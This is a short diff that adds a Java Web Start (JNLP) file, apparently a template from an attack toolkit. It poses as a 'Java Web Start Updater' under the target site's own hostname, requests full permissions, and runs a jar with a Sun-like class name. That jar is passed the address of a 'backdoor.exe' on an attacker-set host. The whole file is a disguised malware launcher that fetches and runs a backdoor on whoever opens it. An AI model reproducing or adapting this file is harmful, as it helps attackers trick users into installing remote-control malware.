@@ -1,0 +1,17 @@
+<?xml version="1.0" encoding="utf-8"?>
+<jnlp codebase="%IPA_URL%" spec="1.0+">
+  <information>
+    <title>Java Web Start Updater</title>
+    <vendor>%SITE_HOSTNAME%</vendor>
+  </information>
+  <security>
+    <all-permissions/>
+  </security>
+  <resources>
+    <j2se version="1.4.2+"/>
+    <jar href="JwsUpdater.jar"/>
+  </resources>
+  <application-desc main-class="com.sun.JwsInstaller.JwsUpdater">
+    <argument>%IPA_URL%/backdoor.exe</argument>
+  </application-desc>
+</jnlp>
